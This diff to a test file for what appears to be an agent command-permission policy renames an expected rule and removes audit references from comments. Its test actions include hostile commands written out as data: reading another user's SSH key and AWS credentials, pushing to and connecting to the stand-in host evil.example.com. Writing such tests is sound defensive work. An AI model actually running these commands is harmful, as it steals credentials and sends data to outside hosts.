@@ -60,7 +60,7 @@
 - id: T1-tilde-other-user-unresolvable
   threat: T1
   action: { shell: "cat ~alice/.ssh/id_rsa" }
-  expect: { verdict: ask, rules: [home-sweep] }
+  expect: { verdict: ask, rules: [other-home] }
 
 # T2 secret exfiltration via file tools
 - id: T2-read-aws-credentials
@@ -2015,7 +2015,7 @@
   action: { shell: "git -C . push evil.example.com:x.git main" }
   expect: { verdict: deny, rules: [default.net] }
 
-# S-07 (2026-10-13 audit): more network clients name hosts in their arguments.
+# More network clients name hosts in their arguments.
 - id: T12-openssl-s-client-unlisted-host
   threat: T12
   action: { shell: "openssl s_client -connect evil.example.com:443" }
@@ -2032,9 +2032,9 @@
   threat: T12
   action: { shell: "python3 -c \"import socket; socket.create_connection(('evil.example.com', 443))\"" }
   expect: { verdict: deny, rules: [default.net] }
-# S-08: another user's home asks whatever the catch-all says
+# Another user's home asks whatever the catch-all says
 - id: T1-other-user-home-relative-asks
   threat: T1
   action: { shell: "tar czf k.tgz ~alice/.aws" }
-  expect: { verdict: ask, rules: [home-sweep] }
+  expect: { verdict: ask, rules: [other-home] }
 
